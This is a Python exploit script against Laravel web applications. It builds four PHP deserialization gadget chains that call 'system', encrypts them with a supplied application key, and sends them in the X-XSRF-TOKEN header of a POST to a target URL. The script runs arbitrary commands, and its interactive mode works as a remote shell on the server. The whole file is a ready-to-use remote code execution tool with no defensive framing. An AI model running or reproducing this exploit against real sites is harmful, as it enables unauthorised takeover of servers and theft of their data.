#! /usr/bin/env python3
from rich.console import Console
from rich.table import Table
from Crypto.Cipher import AES
from hashlib import sha256
from Crypto.Util.Padding import pad
import hmac
import base64
import json
import argparse
import requests
from signal import signal, SIGINT
from sys import exit

console = Console()

# Payload generation function
def generate_payload(cmd, key, method=1):
    if method == 1:
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 2:
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"' + "\x00" + '*' + "\x00" + 'listeners";a:1:{s:' + str(len(cmd)) + ':"' + cmd + '";a:1:{i:0;s:6:"system";}}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 3:
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:39:"Illuminate\\Notifications\\ChannelManager":3:{s:6:"' + "\x00" + '*' + "\x00" + 'app";s:' + str(len(cmd)) + ':"' + cmd + '";s:17:"' + "\x00" + '*' + "\x00" + 'defaultChannel";s:1:"x";s:17:"' + "\x00" + '*' + "\x00" + 'customCreators";a:1:{s:1:"x";s:6:"system";}}}'
    else:
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:31:"Illuminate\\Validation\\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'

    value = base64.b64encode(payload_decoded.encode()).decode('utf-8')
    key = base64.b64decode(key)
    return encrypt(value, key)

# Encrypt function
def encrypt(text, key):
    cipher = AES.new(key, AES.MODE_CBC)
    value = cipher.encrypt(pad(base64.b64decode(text), AES.block_size))
    payload = base64.b64encode(value)
    iv_base64 = base64.b64encode(cipher.iv)
    hashed_mac = hmac.new(key, iv_base64 + payload, sha256).hexdigest()
    iv_base64 = iv_base64.decode('utf-8')
    payload = payload.decode('utf-8')
    data = {'iv': iv_base64, 'value': payload, 'mac': hashed_mac}
    json_data = json.dumps(data)
    payload_encoded = base64.b64encode(json_data.encode()).decode('utf-8')
    return payload_encoded

# Function to handle responses
def extractResponse(resp):
    return resp.split('<!DOCTYPE html>')[0]  # Return HTML portion before any additional content

# Graceful shutdown on SIGINT
def key_handler(signal_received, frame):
    print('Exiting gracefully...')
    exit(0)

# Exploit function to trigger the attack
def exploit(url, api_key, cmd, method=1):
    payload = generate_payload(cmd, api_key, method)
    headers = {'X-XSRF-TOKEN': payload}
    try:
        response = requests.post(url, headers=headers)
        response.raise_for_status()  # Raise an exception for bad responses
        return response
    except requests.exceptions.RequestException as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        exit(1)

# Main function to handle arguments and execute exploit
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('URL', help="Laravel website URL to attack")
    parser.add_argument('API_KEY', help="Base64-encoded Laravel website API_KEY")
    parser.add_argument('-c', '--command', default='uname -a', help="Command to execute (default: 'uname -a')")
    parser.add_argument('-m', '--method', type=int, choices=[1, 2, 3, 4], default=1, help="Payload version: 1, 2, 3, or 4")
    parser.add_argument('-i', '--interactive', action="store_true", help="Interactive mode for multiple command execution")
    args = parser.parse_args()

    resp = exploit(args.URL, args.API_KEY, args.command, args.method)
    console.print("\n" + extractResponse(resp.text))

    if args.interactive:
        signal(SIGINT, key_handler)
        console.print('[bold yellow]Running in interactive mode. Press CTRL+C to exit.[/bold yellow]')
        while True:
            cmd = input('$ ')
            if len(cmd) == 0: continue
            resp = exploit(args.URL, args.API_KEY, cmd, args.method)
            console.print(extractResponse(resp.text))

if __name__ == "__main__":
    main()
